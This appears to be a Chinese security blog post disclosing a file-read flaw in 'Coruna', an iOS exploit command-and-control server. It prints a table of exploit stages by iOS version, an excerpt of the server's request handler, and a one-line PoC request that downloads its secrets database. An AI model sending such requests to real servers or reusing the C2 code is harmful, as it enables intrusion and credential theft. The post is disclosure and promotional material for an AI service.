#  Coruna ios 漏洞C2系统存在前台敏感信息泄露漏洞  
原创 XingYue404
                    XingYue404  星悦安全   2026-09-26 12:03  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0 "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
漏洞完全由 GPT-6-Astra 分析，无特殊提示词 Skill，同款AI见文末.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSokmFFibBefcmbiaichicTuezLpbdJqXshWbOTAZb7hRnzJkvlibs2lTbA9w7VDLUrNVggpuvdxia2U3gZ6ANzw1qbkFxMf4HWRxys0o/640?wx_fmt=png&from=appmsg "")  
  
**系统源码介绍 : Coruna 漏洞利用ios管理系统是面向移动端安全测试场景的端到端 C2 框架，涵盖设备管理、渠道分发、数据回传等能力，采用 Vue3 + FastAPI 开发.**  
  
**📌****受影响版本明细**  
<table><tbody><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">攻击阶段</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">覆盖版本 / 载荷</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage1 初始利用</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 15.2 – 15.5（jacurutu）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage1 初始利用</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 15.6 – 16.1.2（bluebird）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage1 初始利用</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 16.2 – 16.5.1（terrorbird）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage1 初始利用</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 16.6 – 17.2.1（cassowary）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage2 稳定化</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 13.0 – 14.x（breezy）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage2 稳定化</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 15.0 – 16.2（breezy15）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage2 稳定化</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 16.3 – 16.5.1（seedbell）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage2 稳定化</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">iOS 16.6 – 17.2.1（seedbell_pre / seedbell）</span></span></strong></p></td></tr><tr style="height: 33px;"><td data-colwidth="208" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">Stage3 收尾</span></span></strong></p></td><td data-colwidth="350" width="375" style="border: 1px solid #d9d9d9;background-color: rgba(0, 0, 0, 0.05);"><p style="margin: 0;padding: 0;min-height: 24px;"><strong><span style="color: rgb(74, 77, 89);"><span leaf="">VariantA / VariantB（全版本适用）</span></span></strong></p></td></tr></tbody></table>  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSr8641eiba35F73ib308ftvbSiaw95ickBOEsmBI9MteT3TbPatdgCYGUaFfFEp0zvK7qSqiblurSjZReuiaCxAk0kUDmsMOUK7dZibqQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSpmPeXH44KUIxN8zptoPfaSoNzBBm75NyfyHrjLH7wyrp560f2Ytxpzblk1WLOKAMFuniaUQsBsGjXf6cPUaEtOZibCs41s7ubFs/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSqKm9gEuYZGkvhz8dO0ad6kAQx3lpUn2tqW36VAnFiaGsMrpQSqK3H60G3MTqLAkPcwH8GiaNDD0pHOe8cKXFnYFF8KTJu9jbH7I/640?wx_fmt=png&from=appmsg "")  
  
**✅****该系统完整攻击链（Stage1→2→3）：iOS 15.2 – 17.2.1****；iOS 13.0 – 15.1.1 提供 Stage2 基础链，按设备版本自动分发载荷.**  
## 0x01 前台敏感信息泄露  
  
**完整调用链位于 /exploit_server.py 中的1680 - 1843 行代码，如下关联**  
1. do_GET()**的静态资源分支会调用该函数；普通请求还会在后续兜底再次调用**  
1. /ch/**、**/if/**、**/t/**还会先去掉前缀，将含点号的剩余路径当作文件尝试读取**  
1. **_STATIC_SKIP_EXT 只决定是否跳过设备注册，不是访问控制白名单。.py、.env、.db 即使不在其中，仍有后续分支可达**  
1. **根目录确实有**darksword.db**、**exploit_server.py**、**admin/.env**；配置代码读取其中的**SECRET_KEY  
1. **FastAPI 管理端的 JWT 中间逻辑无法保护另一个独立 HTTP 进程。代码还会尝试额外监听 80 端口，成功与否取决于权限和占用情况**  
```
    def do_GET(self) -> None:
        parsed = urlparse(self.path)
        self._parsed_path_cache = parsed
        norm_log = parsed.path.rstrip("/") or "/"
        self._current_norm_path = norm_log
        client_ip = self.client_address[0] if self.client_address else "unknown"
        user_agent = self.headers.get("User-Agent", "")
        query_params = parse_qs(parsed.query) if parsed.query else {}
        if self._host_is_native_c2():
            self._dump_native_c2_request("GET", client_ip, user_agent, self.path, self.headers)

        # ⚡ 性能 + 数据纯净：静态资源请求跳过 _ensure_device_registered，
        #    避免加载 .js/.dylib/.bin 等 payload 文件时误生成"新设备"脏数据。
        report_result_e = None
        for _rk in ("e", "result", "r"):
            if _rk in query_params and query_params[_rk]:
                try:
                    report_result_e = int(query_params[_rk][0])
                except Exception:
                    report_result_e = query_params[_rk][0]
                break
        is_static = self._path_looks_static(norm_log) and report_result_e is None

        if norm_log == "/sdk/embed.js":
            self._serve_embed_js()
            return

        if is_static:
            # 对于已知静态路径，先直接尝试 serve 静态文件，跳过注册设备
            rel = norm_log.lstrip("/")
            if rel:
                try:
                    if self._try_serve_static_file(rel):
                        return
                except Exception:
                    pass
            # 再走 /ch/xxx 风格的静态兜底
            if (norm_log.startswith("/ch/") or norm_log.startswith("/if/") or norm_log.startswith("/t/")):
                _parts = norm_log.split("/", 2)
                if len(_parts) >= 3 and _parts[2]:
                    try:
                        if self._try_serve_static_file(_parts[2]):
                            return
                    except Exception:
                        pass
            # 最后 404
            self.send_error(404, "Not Found")
            return

        # DEFENSE-IN-DEPTH: /ch/<slug> / /if/<slug> / /t/<slug>:
        #   先尝试去掉前缀后直接当项目静态文件 serve！
        #   这样即使 HTML 里用了相对路径（script src="platform_module.js"），
        #   浏览器解析成 /ch/platform_module.js 也能正确返回 JS，而不会被当成 channel slug。
        if (norm_log.startswith("/ch/") or norm_log.startswith("/if/") or norm_log.startswith("/t/")):
            _parts = norm_log.split("/", 2)
            if len(_parts) >= 3 and _parts[2]:
                _candidate_rel = _parts[2]
                if "." in _candidate_rel:  # 只对 "看起来像文件名" 的尝试（含扩展名）
                    try:
                        if self._try_serve_static_file(_candidate_rel):
                            return
                    except Exception:
                        pass

        if norm_log.startswith("/ch/") or norm_log.startswith("/if/") or norm_log.startswith("/t/"):
            parts = norm_log.split("/", 2)
            if len(parts) < 3:
                self._send_body(404, b"Missing slug")
                return
            mode_prefix, slug = parts[1], parts[2]
            slug = unquote(slug.rstrip("/"))
            if not slug:
                self._send_body(404, b"Missing slug")
                return
            channel_id_hint, template_id_hint = None, None
            tpl_slug_raw = (query_params.get("tpl") or [None])[0] or None
            tpl_slug = unquote(tpl_slug_raw) if tpl_slug_raw else None
            ch_obj = None
            tpl_obj = None
            host_h = self.headers.get("Host")
            ref_h = self.headers.get("Referer")
            if mode_prefix == "ch" or mode_prefix == "if":
                ch_obj = _resolve_channel(slug)
                if ch_obj:
                    channel_id_hint = getattr(ch_obj, "id", None)
                    if getattr(ch_obj, "default_template_id", None) and not tpl_slug:
                        template_id_hint = int(ch_obj.default_template_id)
                    # ① Channel enabled + 域名白名单（必须先校验，不要注册设备 / 不要加访问量）
                    if not getattr(ch_obj, "enabled", 1):
                        self._log_request_info("GET", client_ip, self.path,
                                               user_agent=user_agent, channel_id=channel_id_hint,
                                               template_id=template_id_hint)
                        self._send_body(403, b"Channel Disabled", channel_id=channel_id_hint, template_id=template_id_hint)
                        return
                    ok_domain, reason = _validate_channel_domain_restrictions(ch_obj, host_h, ref_h)
                    if not ok_domain:
                        log_msg = f"[SECURITY BLOCK] channel={slug} {reason}"
                        print(f"  {log_msg}")
                        log_to_file(log_msg)
                        save_log_to_db("security", client_ip, "GET", self.path,
                                       status_code=403, user_agent=user_agent,
                                       channel_id=channel_id_hint, template_id=template_id_hint)
                        self._send_body(403,
                                        b"<!doctype html><html><head><meta charset='utf-8'><title>403 Forbidden</title></head>"
                                        b"<body style='font-family:-apple-system,Segoe UI,sans-serif;max-width:640px;margin:80px auto;padding:0 20px'>"
                                        b"<h1 style='color:#d9363e'>403 Forbidden</h1><p>This channel is only accessible from authorized hostnames.</p>"
                                        b"<pre style='background:#f5f5f5;padding:12px;border-radius:6px;word-break:break-all'>" +
                                        reason.encode("utf-8", errors="replace") +
                                        b"</pre></body></html>",
                                        channel_id=channel_id_hint, template_id=template_id_hint)
                        return
            if tpl_slug:
                tpl_obj = _resolve_template(tpl_slug)
                if tpl_obj:
                    template_id_hint = getattr(tpl_obj, "id", None)
            # ② 安全校验全部通过 → 才正式注册设备 + 递增访问量
            dev_uuid, log_cid, log_tid = self._ensure_device_registered(
                query_params,
                channel_id_override=channel_id_hint,
                template_id_override=template_id_hint
            )
            self._log_request_info("GET", client_ip, self.path, user_agent=user_agent,
                                   device_uuid=dev_uuid, channel_id=log_cid, template_id=log_tid)
            # ③ CRITICAL FIX: 302 Redirect to /group.html (device_uuid in cookie is ds_uuid already)
            # Stage3_VariantB's MachOPayloadBuilder computes payload length based on
            # document.URL → long /ch/<slug>?tpl=...&device_uuid=...  -> wrong length -> OOB.
            # Original URL format is /group.html (short path, no query) → correct offsets.
            redirect_to = "http://" + (self.headers.get("Host") or "127.0.0.1:7070") + "/group.html"
            self.send_response(302)
            self.send_header("Location", redirect_to)
            self._write_ds_ids(channel_id=log_cid, template_id=log_tid)
            self.end_headers()
            return

        report_result = None
        for _rk in ("e", "result", "r"):
            if _rk in query_params and query_params[_rk]:
                try:
                    report_result = int(query_params[_rk][0])
                except Exception:
                    report_result = query_params[_rk][0]
                break
        if report_result is not None and norm_log == "/":
            # 🔍 DIAGNOSTIC LOG: capture EVERY detail of the legacy report request
            # so we can debug why powerd dylib's /?e=0 sometimes fails to match device

```  
  
**Payload:**  
```
GET /ch/darksword.db HTTP/1.1
Host: audit.invalid:7070
User-Agent: Audit-Static-Review
Connection: close
```  
  
**可以直接下载到 darksword.db，其中包含****配置密钥、账号哈希、2FA 密钥、设备和采集数据等。若取得有效签名密钥及对应账号状态，可进一步伪造认证.**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSpgpxRE95VCYReU5sApvzMEHQe0fCmHjniaU3eXA4iabR7Hxm4jB4Xl8Nwjt4iccqAsuicE2CFnoB17cS0V2654smpTELSdfV4qeAQ/640?wx_fmt=png&from=appmsg "")  
## 0x02 AI 漏洞挖掘  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**本漏洞完全由星悦AI中转提供的GPT-6-Astra Max挖掘分析.**  
  
****  
https://www.xyusec.com/  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSop9Jg71yM3534dDVDfSbs4pRv1IKLHSTGIvHmeFq4ju1mSicD2BR09862G9lh5UuzrUVpdKIBho9yZqwQfz33Kx0b39Okh8ibug/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
  
新用户还可以添加进群领5$额度  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/De3yb4u5JSrCQGBorjGCEia0U1QibB5wibKHgibC2MPtUfaa9t5RwPzf8qX0SEkw8ovn9wkPewXNcYSobDhTjAJtnzxtYW0P7ic9WSQfjZ1sticpY/640?wx_fmt=jpeg "")  
  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
